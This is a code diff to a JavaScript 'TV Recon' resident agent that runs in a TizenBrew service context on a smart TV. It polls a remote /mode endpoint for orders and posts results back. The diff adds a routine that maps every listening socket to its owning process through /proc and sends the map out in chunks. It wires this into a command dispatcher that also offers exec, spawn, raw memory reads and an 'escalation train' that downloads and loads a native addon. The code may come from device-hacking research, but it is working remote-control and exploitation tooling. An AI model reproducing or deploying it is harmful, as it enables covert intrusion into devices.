@@ -1,4 +1,4 @@
-/* TV Recon v11 — LONG-LIVED RESIDENT AGENT.
+/* TV Recon v12 — LONG-LIVED RESIDENT AGENT.
  * Runs in the TizenBrew service vm context. No crash markers, no throws —
  * a single resident module with a polling loop. Orders from /mode:
  *   {"action":"recon"}   light status posts
@@ -33,8 +33,8 @@ function T(fn) { try { return fn(); } catch (e) { return 'ERR:' + (e && e.messag
 function read(f, n) { return T(function () { return fs.readFileSync(f, 'utf8').slice(0, n || 6000); }); }
 function ls(d) { return T(function () { return fs.readdirSync(d).slice(0, 250); }); }
 
-console.log('TV Recon v11 resident agent starting');
-post('v11-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
+console.log('TV Recon v12 resident agent starting');
+post('v12-online', { time: new Date().toISOString(), uid: process.getuid(), node: process.version });
 
 function getMode(cb) {
     try {
@@ -298,6 +298,64 @@ function doNetprobe(mode) {
     } catch (e) { post('netprobe-err', { err: String(e) }); }
 }
 
+function doFdscan(mode) {
+    /* map every listening socket to its owning process */
+    try {
+        var tcp = T(function () { return fs.readFileSync('/proc/net/tcp', 'utf8'); });
+        var tcp6 = T(function () { return fs.readFileSync('/proc/net/tcp6', 'utf8'); });
+        var unixS = T(function () { return fs.readFileSync('/proc/net/unix', 'utf8'); });
+        var listeners = [];
+        (String(tcp) + '\n' + String(tcp6)).split('\n').forEach(function (line) {
+            var m = line.trim().split(/\s+/);
+            if (m.length < 10) return;
+            if (m[3] !== '0A') return;
+            var port = parseInt(m[1].split(':')[1], 16);
+            listeners.push({ proto: 'tcp', port: port, inode: m[9] });
+        });
+        String(unixS).split('\n').forEach(function (line) {
+            var m = line.trim().split(/\s+/);
+            if (m.length < 8) return;
+            var path = m.slice(7).join(' ');
+            if (!path) return;
+            listeners.push({ proto: 'unix', path: path, inode: m[6] });
+        });
+        post('fdscan-listeners', { count: listeners.length, list: listeners.slice(0, 150) });
+        var pids = T(function () { return fs.readdirSync('/proc').filter(function (x) { return /^[0-9]+$/.test(x); }); });
+        var inodeMap = {};
+        var scanned = 0;
+        if (pids instanceof Array) {
+            pids.forEach(function (pid) {
+                var fds = T(function () { return fs.readdirSync('/proc/' + pid + '/fd'); });
+                if (!(fds instanceof Array)) return;
+                fds.forEach(function (fd) {
+                    var target = T(function () { return fs.readlinkSync('/proc/' + pid + '/fd/' + fd); });
+                    var mm = String(target).match(/^socket:\[(\d+)\]$/);
+                    if (mm) { if (!inodeMap[mm[1]]) inodeMap[mm[1]] = pid; scanned++; }
+                });
+            });
+        }
+        post('fdscan-inodes', { scanned: scanned, unique: Object.keys(inodeMap).length });
+        var joined = [];
+        listeners.forEach(function (L) {
+            var pid = inodeMap[L.inode] || '?';
+            var name = '?';
+            if (pid !== '?') {
+                name = T(function () {
+                    var s = fs.readFileSync('/proc/' + pid + '/status', 'utf8');
+                    var nm = s.match(/^Name:\s*(.*)/m);
+                    var uid = s.match(/^Uid:\s*(\d+)/m);
+                    return (nm ? nm[1] : '?') + ' (uid' + (uid ? uid[1] : '?') + ')';
+                });
+            }
+            joined.push({ t: L.proto, port: L.port || 0, path: L.path || '', pid: pid, name: name });
+        });
+        var CH = 40;
+        for (var c = 0; c < joined.length; c += CH) {
+            post('fdscan-map', { chunk: c / CH, total: joined.length, list: joined.slice(c, c + CH) });
+        }
+    } catch (e) { post('fdscan-err', String(e)); }
+}
+
 function doExploit(mode) {
     /* Choreographed escalation train, one boot:
      * 1. download N-API addon  2. require() it  3. read constructor marker
@@ -402,6 +460,7 @@ function tick() {
                 else if (mode.action === 'nread') doNread(mode);
                 else if (mode.action === 'read64') doRead64(mode);
                 else if (mode.action === 'netprobe') doNetprobe(mode);
+                else if (mode.action === 'fdscan') doFdscan(mode);
                 else if (mode.action === 'dlopentest') doDlopentest(mode);
                 else if (mode.action === 'exec') doExec(mode);
                 else if (mode.action === 'spawn') doSpawn(mode);
